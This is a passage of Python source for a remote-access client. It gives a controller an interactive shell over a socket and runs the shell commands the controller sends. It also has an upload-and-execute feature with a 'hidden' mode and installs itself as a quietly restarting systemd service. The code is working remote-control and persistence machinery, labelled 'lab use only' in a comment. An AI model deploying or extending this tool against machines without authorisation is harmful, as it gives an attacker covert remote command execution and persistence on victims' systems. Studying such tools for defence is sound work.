    helper = _WindowsCtrlCHelper(proc.pid)

    input_queue = queue.Queue(maxsize=64)
    dropped = [0]

    def input_writer():
        while not stop.is_set():
            try:
                command = input_queue.get(timeout=0.2)
            except queue.Empty:
                continue
            if command is None:
                return
            try:
                proc.stdin.write((command + '\r\n').encode('utf-8', 'replace'))
                proc.stdin.flush()
            except (OSError, ValueError):
                stop.set()
                return

    writer_thread = threading.Thread(target=input_writer, name='pipe-shell-input',
                                     daemon=True)
    writer_thread.start()

    def echo(text):
        try:
            send_raw(text.encode('utf-8', 'replace'))
        except OSError:
            stop.set()

    decoder = codecs.getincrementaldecoder('utf-8')('replace')
    pending_escape = ''
    line = []
    last_was_cr = False
    try:
        while not stop.is_set():
            try:
                data = sock.recv(65536)
            except (OSError, BrokenPipeError):
                break
            if not data:
                break
            text, pending_escape = _filter_shell_keys(
                pending_escape + decoder.decode(data))
            for char in text:
                if char == '\n' and last_was_cr:
                    last_was_cr = False
                    continue
                last_was_cr = char == '\r'
                if char in ('\r', '\n'):
                    command = ''.join(line)
                    line = []
                    echo('\r\n')
                    try:
                        input_queue.put_nowait(command)
                    except queue.Full:
                        dropped[0] += 1
                        echo('\r\n[client] input queue full; line dropped\r\n')
                    continue
                if char in ('\x7f', '\x08'):
                    if line:
                        line.pop()
                        echo('\b \b')
                    continue
                if char == '\x03':
                    line = []
                    echo('^C\r\n')
                    if not helper.send():
                        # No real console event: deliver a literal ETX too;
                        # some PowerShell hosts still see it as an interrupt.
                        try:
                            proc.stdin.write(b'\x03')
                            proc.stdin.flush()
                        except (OSError, ValueError):
                            stop.set()
                    continue
                if char == '\t':
                    # Completion needs a real console; treat Tab as spaces so
                    # the command is still readable and executable.
                    line.extend('    ')
                    echo('    ')
                    continue
                if char < ' ':
                    continue
                line.append(char)
                echo(char)
    except (OSError, BrokenPipeError):
        pass
    finally:
        stop.set()
        try:
            helper.close()
        except Exception:
            pass
        try:
            proc.kill()
        except Exception:
            pass
        try:
            proc.stdin.close()
        except (OSError, ValueError):
            pass
        try:
            input_queue.put_nowait(None)
        except queue.Full:
            pass
        try:
            writer_thread.join(0.5)
        except Exception:
            pass
        try:
            proc.wait(timeout=0.5)
        except Exception:
            pass

def _interactive_shell_thread(host, port, scheme='auto', token=None):
    """Background worker: run one interactive shell session for the controller."""
    sock = None
    try:
        if SHELL_CANCEL.is_set():
            return
        try:
            sock = _connect_shell(host, port, scheme, token)
        except OSError as e:
            if not SHELL_CANCEL.is_set():
                print('[!] shell: could not reach the controller shell channel: {}'.format(e))
            return
        with SHELL_LOCK:
            if SHELL_CANCEL.is_set():
                return
            SHELL_SOCK[0] = sock

        try:                            # terminal-size handshake (rows, cols)
            sock.settimeout(SHELL_HANDSHAKE_TIMEOUT)
            rows, cols = struct.unpack('!HH', _recv_exact(sock, 4))
            sock.settimeout(None)
        except Exception as e:
            if not SHELL_CANCEL.is_set():
                print('[!] shell: handshake failed: {}'.format(e))
            return
        if SHELL_CANCEL.is_set():
            return
        if rows <= 0 or cols <= 0:
            rows, cols = 24, 80

        print('[+] Interactive shell session started ({}x{}).'.format(rows, cols))
        if os.name == 'nt':
            _shell_windows(sock, rows, cols)
        else:
            _shell_unix(sock, rows, cols)
        print('[+] Interactive shell session ended.')
    except Exception as e:
        print('[!] shell session error: {}'.format(e))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        with SHELL_LOCK:
            if SHELL_SOCK[0] is sock:
                SHELL_SOCK[0] = None
            if SHELL_THREAD[0] is threading.current_thread():
                SHELL_THREAD[0] = None
        SHELL_BUSY.release()


def start_interactive_shell(control_socket, host, port, scheme='auto',
                            token=None, req_id=None):
    """Handle a 'shell' request from the controller: one interactive shell,
    in the background, so the main command connection keeps working."""
    if not SHELL_BUSY.acquire(blocking=False):
        send_msg(control_socket, {'type': 'error', 'id': req_id,
                                  'data': 'an interactive shell is already running'})
        return
    try:
        with SHELL_LOCK:
            # A new shell request is a fresh session; clear a cancel left by
            # the previous control link before the worker can see it.
            SHELL_CANCEL.clear()
            thread = threading.Thread(
                target=_interactive_shell_thread,
                args=(host, port, scheme, token),
                name='interactive-shell', daemon=True)
            SHELL_THREAD[0] = thread
        thread.start()
    except Exception as e:
        with SHELL_LOCK:
            SHELL_THREAD[0] = None
        SHELL_BUSY.release()
        send_msg(control_socket, {'type': 'error', 'id': req_id, 'data': 'shell: {}'.format(e)})


# ---------------------------------------------------------------------------
# Command control ("cancel"): commands run in their own process group so
# the controller can stop a long one (Ctrl+Z there) and keep the client alive.
# ---------------------------------------------------------------------------

def _signal_session(session_id, sig):
    """Signal every process in one session (best effort, POSIX only).

    A non-interactive `/bin/sh` keeps background children in the shell's
    process group, but a job-control shell (fish/bash -i) gives each job its
    own process group while all remain in the shell's session.  killpg() alone
    misses those jobs once the shell exits and they are reparented away.
    Explicitly daemonized jobs (setsid) leave the session and are left alone.
    """
    if os.name == 'nt':
        return
    signaled = False
    if os.path.isdir('/proc'):
        try:
            entries = os.listdir('/proc')
        except OSError:
            entries = []
        for entry in entries:
            if not entry.isdigit():
                continue
            try:
                with open('/proc/{}/stat'.format(entry)) as f:
                    data = f.read()
                fields = data[data.rfind(')') + 2:].split()
                if len(fields) < 4 or int(fields[3]) != session_id:
                    continue
                os.kill(int(entry), sig)
                signaled = True
            except (OSError, ValueError, IndexError):
                continue
        return signaled
    # macOS/BSD have no /proc; ps can tell us the session id.
    try:
        result = subprocess.run(['ps', '-axo', 'pid=,sess='],
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                timeout=5)
        for line in result.stdout.decode('ascii', 'replace').splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[1].isdigit() \
                    and int(parts[1]) == session_id:
                try:
                    os.kill(int(parts[0]), sig)
                    signaled = True
                except (OSError, ValueError):
                    pass
    except Exception:
        pass
    return signaled


def _kill_orphan_group(pid):
    """Stop children left in a command shell's process group/session.

    Called when the direct shell has already exited (for example a cancel
    arrives during the short tail-collection window).  The shell pid is both
    the process-group id (start_new_session) and the session id created by
    pty.fork for the interactive shell.
    """
    if os.name == 'nt':
        return
    for sig, pause in ((signal.SIGTERM, 0.05), (signal.SIGKILL, 0.0)):
        try:
            os.killpg(pid, sig)
        except OSError:
            pass
        _signal_session(pid, sig)
        if pause:
            time.sleep(pause)


def _kill_process(proc):
    """Stop a running command, children included."""
    if proc.poll() is not None:
        # The shell is gone, but `cmd &` children can still be alive and hold
        # the output pipe. A cancel in that window must clean them up too.
        _kill_orphan_group(proc.pid)
        return
    if os.name == 'nt':
        try:
            result = subprocess.run(['taskkill', '/F', '/T', '/PID', str(proc.pid)],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    timeout=10, creationflags=CREATE_NO_WINDOW)
            if result.returncode == 0:
                return              # taskkill really stopped the tree
        except Exception:
            pass
        # taskkill can fail (access denied, a process that already changed
        # state, ...): kill the direct child as the fallback instead of
        # pretending the command is gone.
        try:
            proc.kill()
        except Exception:
            pass
        return

    try:
        group = os.getpgid(proc.pid)
    except OSError:
        group = None
    for sig, grace in ((signal.SIGTERM, 1.0), (signal.SIGKILL, 2.0)):
        try:
            if group is not None:
                os.killpg(group, sig)
            else:
                proc.send_signal(sig)
        except OSError:
            return
        try:
            proc.wait(timeout=grace)
            return
        except subprocess.TimeoutExpired:
            continue


def _cleanup_leftover_group(pid):
    """Hang up background jobs when their command shell has exited.

    `cmd &` is not a supported way to keep a job running here: Ctrl+B on the
    controller is (it keeps the whole operation tracked). A job left behind
    would be an untracked orphan holding the command pipe, so give the shell's
    process group a SIGHUP. Explicitly daemonized jobs (setsid/nohup) escape
    this and keep running, as they would in a real terminal."""
    if os.name == 'nt':
        return
    try:
        os.killpg(pid, signal.SIGHUP)
    except OSError:
        pass


def _decode_command_output(data):
    """Decode command output; Windows console tools use the OEM code page."""
    if not data:
        return ''
    if os.name == 'nt':
        try:
            import ctypes
            oem = 'cp{}'.format(ctypes.windll.kernel32.GetOEMCP())
            try:
                return data.decode('utf-8')
            except UnicodeDecodeError:
                return data.decode(oem, errors='replace')
        except Exception:
            pass
    return data.decode('utf-8', errors='replace')


def run_command(conn, command, current_dir, req_id=None):
    """Run one shell command and return (output_text, stop, exit_code).

    The command gets its own session/process group, so the whole tree can be
    killed when the controller sends 'cancel' with this request's id (its
    Ctrl+Z) or when the control connection dies. stop=True means the
    controller asked us to exit. exit_code is the real process status for a
    normally finished command; it is None when the command was stopped or the
    controller disappeared. Requests that arrive while the command runs are
    queued (DEFERRED) instead of being dropped, so a background operation on
    the controller side still gets its answer."""
    if os.name == 'nt':
        kwargs = {'creationflags': (subprocess.CREATE_NEW_PROCESS_GROUP
                                    | CREATE_NO_WINDOW)}
    else:
        kwargs = {'start_new_session': True}
        shell_exe = _shell_executable()
        if shell_exe:
            kwargs['executable'] = shell_exe
    try:
        proc = subprocess.Popen(command, shell=True, cwd=current_dir,
                                stdin=subprocess.DEVNULL,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                **kwargs)
    except Exception as e:
        return '{}'.format(e), False, 127

    chunks = []
    size = [0]
    last_data = [time.time()]
    reader_done = threading.Event()
    stop_reader = threading.Event()

    def reader():
        # Windows select() only understands sockets. PeekNamedPipe lets us
        # poll a pipe without blocking forever; a background child holding
        # the pipe open used to pin this thread and its handle after the
        # command had already returned.
        win_handle = win_kernel32 = win_avail = None
        ctypes_mod = None
        if os.name == 'nt':
            try:
                import ctypes
                import msvcrt
                ctypes_mod = ctypes
                win_kernel32 = ctypes.windll.kernel32
                win_handle = msvcrt.get_osfhandle(proc.stdout.fileno())
                win_avail = ctypes.c_ulong()
            except Exception:
                win_handle = None
        try:
            while not stop_reader.is_set():
                amount = 65536
                if os.name == 'nt':
                    if win_handle is None:
                        break
                    if not win_kernel32.PeekNamedPipe(
                            win_handle, None, 0, None,
                            ctypes_mod.byref(win_avail), None):
                        break
                    if win_avail.value == 0:
                        time.sleep(0.05)
                        continue
                    amount = min(amount, int(win_avail.value))
                else:
                    # Bounded select: a background job can keep the pipe open
                    # long after the shell exits, and a plain blocking read
                    # would pin this daemon thread (and its FD) forever.
                    ready, _, _ = select.select([proc.stdout], [], [], 0.05)
                    if not ready:
                        continue
                data = os.read(proc.stdout.fileno(), amount)
                if not data:
                    break
                last_data[0] = time.time()
                if size[0] < MAX_OUTPUT:
                    chunks.append(data)
                    size[0] += len(data)
        except (OSError, ValueError):
            pass
        finally:
            reader_done.set()

    reader_thread = threading.Thread(target=reader, daemon=True)
    reader_thread.start()

    killed = truncated = stop = disconnected = False
    kill_why = 'Ctrl+Z'
    shell_exited_at = None
    clean_exit = False
    exit_code = None
    while True:
        if size[0] >= MAX_OUTPUT and not truncated:
            # The command writes faster than any link could carry: stop
            # collecting output (the reader thread keeps draining the pipe, so
            # the command never blocks on it). The command itself keeps running
            # - Ctrl+Z / 'stop' on the controller is what ends it.
            truncated = True
        exited = proc.poll() is not None
        if exited:
            if shell_exited_at is None:
                shell_exited_at = time.time()
            if (reader_done.is_set()
                    or (time.time() - last_data[0]) > 0.5
                    or (time.time() - shell_exited_at) > 2.0):
                # The shell is gone. A background child may still hold stdout
                # open and even write forever; 2 s is enough to collect its
                # tail, then the reader is stopped so nothing leaks.
                clean_exit = True
                try:
                    exit_code = proc.returncode
                except Exception:
                    exit_code = None
                break
        # Wait for a control message - or, on POSIX, for the command's output
        # pipe to hit EOF, which happens the instant it exits. That is what
        # makes a short command return immediately instead of waiting for a
        # poll tick (this was a fixed 200 ms cost on every single command).
        if os.name == 'nt':
            watch, timeout = [conn], 0.02        # Windows: sockets only in select
        elif not reader_done.is_set():
            # A command can keep running after it closes or redirects stdout
            # (`exec >/dev/null; long-job`). Once the pipe is at EOF it stays
            # readable forever; selecting it again would spin this loop at
            # 1000 Hz for the whole command. Poll only the control socket.
            watch, timeout = [conn, proc.stdout], 0.2
        else:
            watch, timeout = [conn], 0.2
        readable, _, _ = select.select(watch, [], [], timeout)

        if conn in readable:
            msg = recv_msg(conn)
            if msg is None:                     # controller gone: stop, reconnect
                _kill_process(proc)
                disconnected = True
                break
            mtype = msg.get('type')
            if mtype == 'cancel':
                # Ctrl+Z / 'stop' on the controller: it names the request to stop.
                target = msg.get('id')
                why = msg.get('why') or 'Ctrl+Z'
                if target is None or target == req_id:
                    kill_why = why
                    _kill_process(proc)
                    killed = True
                else:
                    _mark_canceled(target, why)  # a queued request: skip it later
                    key = _incoming_key(target)
                    state = (INCOMING_TRANSFERS.get(key)
                             if key is not None else None)
                    if state is not None:
                        state.abort({'reason': why})
                    _outgoing_cancel(target)
            elif mtype == 'cmd_kill':           # older controller: stop this one
                _kill_process(proc)
                killed = True
            elif mtype == 'screenshare_stop':
                stop_stream(wait=0.5)           # a share can run next to a command
            elif mtype == 'exit':
                _kill_process(proc)
                stop = True
                break
            elif mtype in ('transfer_begin', 'transfer_entries',
                           'transfer_file_begin', 'transfer_chunk',
                           'transfer_file_end', 'transfer_abort',
                           'transfer_end'):
                # A background upload may run while this command does.  Feed
                # its stream to the receive state instead of deferring chunks
                # (the bounded queue would reject most of a large file).
                _handle_transfer_message(conn, msg, msg.get('id'), current_dir)
            elif mtype == 'download':
                # Let a background download start now instead of waiting for
                # a long command; its worker only writes to the socket.
                _serve_download_request(conn, msg, msg.get('id'), current_dir)
            else:
                # A request sent while this command runs (the controller can
                # have several operations in flight now): answer it once this
                # command is done instead of dropping it - dropping it would
                # leave that operation hanging forever. The queue is bounded.
                deferred_id = msg.get('id')
                if not _defer_message(msg):
                    if deferred_id is not None and _valid_req_id(deferred_id):
                        try:
                            send_msg(conn, {'type': 'error', 'id': deferred_id,
                                            'data': 'client busy: request queue is full'})
                        except OSError:
                            pass
            continue

        if os.name != 'nt' and proc.stdout in readable:
            time.sleep(0.001)           # output flowing: let the reader drain it
            continue

    if clean_exit and not (killed or disconnected or stop):
        _cleanup_leftover_group(proc.pid)
    stop_reader.set()
    reader_thread.join(timeout=1.5)
    # Close the pipe even if the reader is still winding down: on Windows a
    # blocked ReadFile/handle would otherwise outlive the command and leak one
    # thread plus one handle per backgrounded command.
    if os.name == 'nt' or not reader_thread.is_alive():
        try:
            proc.stdout.close()
        except OSError:
            pass
    text = _decode_command_output(b''.join(chunks))
    notes = []
    if killed:
        notes.append('[client] command stopped by the controller ({})'.format(kill_why))
    if disconnected:
        notes.append('[client] controller disconnected - command stopped')
    if truncated:
        notes.append('[client] output cut off after {} MB (the command kept running)'.format(
            '{:g}'.format(round(MAX_OUTPUT / (1024.0 * 1024.0), 2))))
    if notes:
        if text and not text.endswith('\n'):
            text += '\n'
        text += '\n'.join(notes)
    if killed or disconnected or stop:
        exit_code = None
    return text, stop, exit_code


# ---------------------------------------------------------------------------
# upex (upload & execute): the controller uploads the file(s), then sends one
# 'upex' request naming the files already in this directory.  Compilation,
# interpreter selection, fallback order and hidden mode stay on the client so
# every target OS uses its own native commands without shell-quoting guesses
# made on the controller.
# ---------------------------------------------------------------------------

_UPEX_APP_TYPES = {
    'py', 'c', 'cpp', 'cs', 'js', 'ts', 'swift', 'sh', 'bat',
    'exe', 'elf', 'macho', 'bin',
}
_UPEX_AUTO_TYPES = {'py', 'cs', 'js', 'sh'}
_UPEX_EXTENSIONS = {
    '.py': 'py', '.pyw': 'py',
    '.c': 'c',
    '.cc': 'cpp', '.cpp': 'cpp', '.cxx': 'cpp', '.c++': 'cpp',
    '.cs': 'cs',
    '.js': 'js', '.mjs': 'js', '.cjs': 'js',
    '.ts': 'ts',
    '.swift': 'swift',
    '.sh': 'sh', '.bash': 'sh',
    '.bat': 'bat', '.cmd': 'bat',
    '.exe': 'exe',
    '.elf': 'elf',
    '.macho': 'macho',
}


def _upex_simple_name(value):
    """Return a safe single filename for the client's current directory."""
    if not isinstance(value, str):
        return None
    name = value.replace('\\', '/')
    if (not name or name in ('.', '..') or '\x00' in name
            or '/' in name or name.startswith('/')):
        return None
    return name


def _upex_type_from_name(name):
    return _UPEX_EXTENSIONS.get(os.path.splitext(name)[1].lower(), '')


def _upex_detect_type(path, hint=''):
    """Detect an app type, including extensionless ELF/Mach-O/shell files."""
    hint = (hint or '').lower()
    if hint in _UPEX_APP_TYPES:
        return hint
    by_name = _upex_type_from_name(os.path.basename(path))
    if by_name:
        return by_name
    try:
        with open(path, 'rb') as f:
            head = f.read(160)
    except OSError:
        return 'unknown'
    if head.startswith(b'\x7fELF'):
        return 'elf'
    if head[:4] in (b'\xfe\xed\xfa\xce', b'\xce\xfa\xed\xfe',
                    b'\xfe\xed\xfa\xcf', b'\xcf\xfa\xed\xfe',
                    b'\xca\xfe\xba\xbe', b'\xbe\xba\xfe\xca'):
        return 'macho'
    if head.startswith(b'MZ'):
        return 'exe'
    if head.startswith(b'#!'):
        first = head.split(b'\n', 1)[0].lower()
        if b'python' in first:
            return 'py'
        if b'node' in first:
            return 'js'
        if b'sh' in first:
            return 'sh'
    # A bare executable is the documented extensionless shell/ELF/Mach-O case
    # on Unix.  Windows needs an explicit .exe (or a file association).
    return 'bin' if os.name != 'nt' else 'unknown'


def _upex_attempt(label, command, run=''):
    """One command to try; run is an optional second command after success."""
    return {'label': label, 'command': command, 'run': run}


def _upex_auto_command(auto, app, auto_type, hidden):
    """Return (attempts, error) for the selected auto launcher.

    New-Feature-Add.txt specifies the exact command names.  Do not probe PATH:
    execute the command and let its own failure drive the documented fallback.
    """
    auto_type = (auto_type or _upex_type_from_name(auto)).lower()
    if auto_type not in _UPEX_AUTO_TYPES:
        return [], 'auto mode supports only py, cs, js and sh'
    flag = ' --hidden' if hidden else ''
    if auto_type == 'py':
        # Use the Windows Python launcher on Windows and the literal python
        # command from the auto.py section elsewhere.  No quotes are added.
        launcher = 'py' if os.name == 'nt' else 'python'
        return [_upex_attempt(
            launcher, '{} {} {} {}'.format(launcher, auto, app, flag))], ''
    if auto_type == 'cs':
        # The '--' belongs to dotnet and is used only for the C# launcher.
        return [_upex_attempt(
            'dotnet', 'dotnet run --file {} -- {} {}'.format(
                auto, app, flag))], ''
    if auto_type == 'js':
        return [_upex_attempt(
            'node', 'node {} {} {}'.format(auto, app, flag))], ''
    # POSIX shell launcher: bash first, then sh, then the executable bit.
    # These are tried by execution failure, not by checking whether they exist.
    attempts = [
        _upex_attempt('bash', 'bash {} {} {}'.format(auto, app, flag)),
        _upex_attempt('sh', 'sh {} {} {}'.format(auto, app, flag)),
    ]
    if os.name != 'nt':
        attempts.append(_upex_attempt(
            'chmod', 'chmod +x {} && ./{} {} {}'.format(
                auto, auto, app, flag)))
    return attempts, ''


def _upex_compiler_candidates(app, app_type):
    """Compile attempts in the exact OS priority order from the spec.

    Availability is never probed.  A failed compiler command is what moves the
    plan to the next documented compiler.
    """
    windows = os.name == 'nt'
    mac = is_macos()
    android = is_android()
    ios = is_ios()
    base = os.path.splitext(os.path.basename(app))[0]
    output = base + ('.exe' if windows else '')
    run = '.\\' + output if windows else './' + output
    if app_type == 'c':
        if windows:
            return [
		_upex_attempt('cl', 'cl /Fe:{} {}'.format(output, app), run),
		_upex_attempt('gcc', 'gcc {} -o {}'.format(app, output), run)
            ]
        if android:
            # Termux normally provides clang, but keep the existing gcc-first
            # order and fall back only after a real failure.
            return [
                _upex_attempt('gcc', 'gcc {} -o {}'.format(app, output), run),
		_upex_attempt('clang', 'clang {} -o {}'.format(app, output), run)
            ]
        if mac or ios:
            return [
                _upex_attempt('clang', 'clang {} -o {}'.format(app, output), run),
                _upex_attempt('gcc', 'gcc {} -o {}'.format(app, output), run)
            ]
        return [
            _upex_attempt('gcc', 'gcc {} -o {}'.format(app, output), run)
        ]

    if app_type == 'cpp':
        if windows:
            return [
                _upex_attempt('cl', 'cl /EHsc /Fe:{} {}'.format(output, app), run),
                _upex_attempt('g++', 'g++ {} -o {}'.format(app, output), run)
            ]
        if android:
            return [
                _upex_attempt('g++', 'g++ {} -o {}'.format(app, output), run),
                _upex_attempt('clang++', 'clang++ {} -o {}'.format(app, output), run)
            ]
        if mac or ios:
            return [
                _upex_attempt('clang++', 'clang++ {} -o {}'.format(app, output), run)
            ]
        return [
            _upex_attempt('g++', 'g++ {} -o {}'.format(app, output), run)
        ]
    return []


def _upex_app_plan(app, app_type, hidden):
    """Build the exact OS command attempts for one app.

    No interpreter or compiler is looked up in PATH.  Commands are constructed
    from New-Feature-Add.txt and executed as written; only the documented
    alternatives are attempted after a real command failure.
    """
    app_type = (app_type or _upex_type_from_name(app)).lower()
    windows = os.name == 'nt'
    mac = is_macos()
    ios = is_ios()

    if hidden:
        return None, 'hidden mode is only available with an auto launcher'

    if app_type == 'py':
        launcher = 'py' if windows else 'python3'
        return {'attempts': [
            _upex_attempt(launcher, '{} {}'.format(launcher, app))]}, ''
    if app_type == 'js':
        return {'attempts': [
            _upex_attempt('node', 'node {}'.format(app))]}, ''
    if app_type == 'cs':
        # dotnet first; csc is only reached if dotnet actually fails.
        output = os.path.splitext(os.path.basename(app))[0] + '.exe'
        run = '.\\' + output if windows else 'mono ' + output
        return {'attempts': [
            _upex_attempt('dotnet', 'dotnet run --file {}'.format(app)),
            _upex_attempt('csc', 'csc /out:{} {}'.format(output, app), run),
        ]}, ''
        
    if app_type in ('c', 'cpp'):
        attempts = _upex_compiler_candidates(app, app_type)
        if not attempts:
            return None, 'unsupported {} compiler'.format(app_type.upper())
        return {'attempts': attempts}, ''
    if app_type == 'swift':
        base = os.path.splitext(os.path.basename(app))[0]
        output = base + ('.exe' if windows else '')
        run = '.\\' + output if windows else './' + output
        return {'attempts': [
            _upex_attempt('swift', 'swift {}'.format(app)),
            _upex_attempt('swiftc', 'swiftc {} -o {}'.format(app, output), run),
        ]}, ''
    if app_type == 'sh':
        if windows:
            # Not part of the Windows matrix, but keep the existing support
            # without probing: bash, then sh, both executed literally.
            return {'attempts': [
                _upex_attempt('bash', 'bash {}'.format(app)),
                _upex_attempt('sh', 'sh {}'.format(app)),
            ]}, ''
        return {'attempts': [
            _upex_attempt('chmod', 'chmod +x {} && ./{}'.format(
                app, app))]}, ''
    if app_type == 'bat':
        if not windows:
            return None, '.bat files run on Windows only'
        return {'attempts': [
            _upex_attempt('cmd', '.\\' + app)]}, ''
    if app_type == 'exe':
        if not windows:
            return None, '.exe files run on Windows only'
        return {'attempts': [
            _upex_attempt('cmd', '.\\' + app)]}, ''
    if app_type == 'elf':
        if windows or mac or ios:
            return None, '.elf files run on Linux/Android only'
        return {'attempts': [
            _upex_attempt('chmod', 'chmod +x {} && ./{}'.format(
                app, app))]}, ''
    if app_type == 'macho':
        if not (mac or ios):
            return None, '.macho files run on macOS/iOS only'
        return {'attempts': [
            _upex_attempt('chmod', 'chmod +x {} && ./{}'.format(
                app, app))]}, ''
    if app_type == 'bin':
        if windows:
            return None, ('an extensionless executable needs Linux/macOS; '
                          'use app.exe on Windows')
        return {'attempts': [
            _upex_attempt('chmod', 'chmod +x {} && ./{}'.format(
                app, app))]}, ''
    if app_type == 'ts':
        return None, ('TypeScript needs an auto launcher; use '
                      '"upex auto.py app.ts", auto.cs, auto.js or auto.sh')
    return None, 'unsupported app type'


def _upex_append(parts, text):
    text = (text or '').strip()
    if text:
        parts.append(text)


def _upex_execute_attempts(conn, req_id, current_dir, attempts):
    """Try commands in order; stop at the first success.

    A successful compile attempt with a ``run`` command immediately runs that
    binary and returns its status.  A failed command advances to the next
    documented alternative.  No PATH check happens before any command.
    """
    parts = []
    last_code = None
    for index, attempt in enumerate(attempts):
        text, stop, code = run_command(
            conn, attempt['command'], current_dir, req_id)
        _upex_append(parts, text)
        if stop or code is None:
            return '\n'.join(parts), stop, code
        last_code = code
        if code == 0:
            run = attempt.get('run')
            if not run:
                return '\n'.join(parts), False, 0
            text, stop, code = run_command(conn, run, current_dir, req_id)
            _upex_append(parts, text)
            return '\n'.join(parts), stop, code
        if index + 1 < len(attempts):
            parts.append('[upex] {} failed (exit {}); trying the next option'
                         .format(attempt['label'], code))
    if not parts:
        parts.append('[upex] no command could run the app')
    return '\n'.join(parts), False, last_code


def run_upex(conn, msg, current_dir, req_id=None):
    """Handle one 'upex' request after the controller uploaded the file(s)."""
    app = _upex_simple_name(msg.get('app'))
    if not app:
        return 'upex: unsafe or missing app filename', False, 1
    app_path = os.path.join(current_dir, app)
    if not os.path.isfile(app_path):
        return 'upex: file not found: {}'.format(app), False, 1
    app_type = _upex_detect_type(app_path, msg.get('app_type'))
    if app_type not in _UPEX_APP_TYPES:
        return 'upex: unsupported app type for {}'.format(app), False, 1

    auto = msg.get('auto')
    hidden = bool(msg.get('hidden'))
    if auto:
        auto = _upex_simple_name(auto)
        if not auto:
            return 'upex: unsafe or missing auto filename', False, 1
        auto_path = os.path.join(current_dir, auto)
        if not os.path.isfile(auto_path):
            return 'upex: auto file not found: {}'.format(auto), False, 1
        auto_type = (msg.get('auto_type') or
                     _upex_type_from_name(auto)).lower()
        attempts, error = _upex_auto_command(auto, app, auto_type, hidden)
        if error:
            return 'upex: {}'.format(error), False, 1
        text, stop, code = _upex_execute_attempts(
            conn, req_id, current_dir, attempts)
        if code not in (None, 0):
            note = '[upex] auto launcher exited with status {}'.format(code)
            text = '{}\n{}'.format(text, note) if text.strip() else note
        return text, stop, code

    if hidden:
        return 'upex: --hidden is only available with an auto launcher', False, 1
    plan, error = _upex_app_plan(app, app_type, hidden)
    if error:
        return 'upex: {}'.format(error), False, 1
    return _upex_execute_attempts(
        conn, req_id, current_dir, plan['attempts'])
# ---------------------------------------------------------------------------
# Auto-start ("persistence"): the client can install itself so it starts
# quietly after a reboot/logon. Based on autorunner.py - lab use only.
# ---------------------------------------------------------------------------

def get_os_info():
    if is_android():
        return android_name()
    if is_ios():
        return ios_name()
    if is_macos():
        return macos_name()
    os_type = platform.system().lower()
    if os_type == 'linux':
        try:
            with open('/etc/os-release') as f:
                info = dict(line.strip().split('=', 1) for line in f if '=' in line)
            return 'Linux ({})'.format(info.get('NAME', 'Generic Linux').strip('"'))
        except OSError:
            return 'Linux (Unknown Distro)'
    if os_type == 'windows':
        # platform.release() still says "10" on Windows 11 (the kernel is
        # 10.0); the build number is the reliable distinction.
        try:
            info = sys.getwindowsversion()
            name = '11' if info.build >= 22000 else '10'
            return 'Windows {} (build {})'.format(name, info.build)
        except Exception:
            return 'Windows {}'.format(platform.release())
    return platform.system()


def is_omarchy():
    if is_android() or is_macos() or is_ios():
        return False
    if platform.system().lower() != 'linux':
        return False
    try:
        with open('/etc/os-release') as f:
            return 'omarchy' in f.read().lower()
    except OSError:
        return False


def _user_manager_running():
    try:
        return os.path.isdir('/run/user/{}/systemd'.format(os.getuid()))
    except AttributeError:
        return False


def run_quiet(cmd):
    """Run a setup command; True when it succeeded (bounded: a wedged
    installer or service tool must not hang the setup report forever)."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=30, **_quiet_flags()).returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _systemd_quote(word, command=False):
    """Quote one word for a systemd unit value (a path with spaces, ...).

    '%' starts a specifier in every unit setting, so a literal '%' must be
    written as '%%' (otherwise a directory like '100% done' breaks the unit).
    '$' is expanded as an environment variable in ExecStart=, so command words
    need '$$'. Ordinary values stay unquoted so the unit file stays readable."""
    word = str(word).replace('%', '%%')
    if command:
        word = word.replace('$', '$$')
    if any(ch in word for ch in ' \t"\'\\'):
        return '"{}"'.format(word.replace('\\', '\\\\').replace('"', '\\"'))
    return word


def _systemd_env_value(value):
    """Quote one Environment= value; systemd specifiers use %."""
    value = str(value).replace('\r', ' ').replace('\n', ' ').replace('%', '%%')
    if any(ch in value for ch in ' \t"\'\\'):
        value = '"{}"'.format(value.replace('\\', '\\\\').replace('"', '\\"'))
    return value


def _systemd_user_environment():
    """Keep the display variables a user service needs for screen capture.

    systemd --user does not necessarily import DISPLAY/WAYLAND_DISPLAY from
    the login session. Without them a persisted desktop client thinks it is
    headless and refuses screenshots even though a desktop is running."""
    lines = []
    for name in ('DISPLAY', 'WAYLAND_DISPLAY', 'XAUTHORITY', 'XDG_CURRENT_DESKTOP'):
        value = os.environ.get(name)
        if value:
            lines.append('Environment={}={}\n'.format(
                name, _systemd_env_value(value)))
    return ''.join(lines)


def _service_body(exec_cmd, silent, log_file, after, wanted, user_line, env_lines=''):
    if log_file:
        # NOTE: after 'append:' the rest of the line is the path. Quoting it
        # ("append:\"/x/y\"") makes systemd treat the value as relative and
        # silently drop the setting - spaces need no quoting here.
        out = 'append:{}'.format(os.path.abspath(log_file).replace('%', '%%'))
    elif silent:
        out = 'null'
    else:
        out = 'journal'
    after_line = '' if after is None else 'After={}\n'.format(after)
    # WorkingDirectory= is not quoted by systemd: quotes become part of the
    # path ("... is not absolute"). Spaces are fine as the rest of the line;
    # only '%' needs specifier escaping.
    working_dir = os.path.dirname(SCRIPT_PATH).replace('%', '%%')
    return (
        "[Unit]\n"
        "Description=Auto-run for {}\n"
        "{}"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "{}"
        "{}ExecStart={}\n"
        "WorkingDirectory={}\n"
        "Restart=on-failure\n"
        "RestartSec=3\n"
        "StandardInput=null\n"
        "StandardOutput={}\n"
        "StandardError={}\n"
        "\n"
        "[Install]\n"
        "WantedBy={}\n"
    ).format(AUTORUN_NAME.replace('%', '%%'), after_line, env_lines, user_line,
             exec_cmd, working_dir, out, out, wanted)


def setup_linux(ip, port, silent, log_file):
    if not shutil.which('systemctl'):
        print('[-] systemd is not available on this system.')
        return False

    python = sys.executable or shutil.which('python3') or 'python3'
    # Quote per word: a script path with spaces must not be split by systemd.
    # command=True also escapes '$' (ExecStart expands env vars) and '%'
    # (systemd specifiers) so any legal directory name survives.
    exec_cmd = ' '.join(_systemd_quote(part, command=True)
                        for part in (python, SCRIPT_PATH, ip, port))
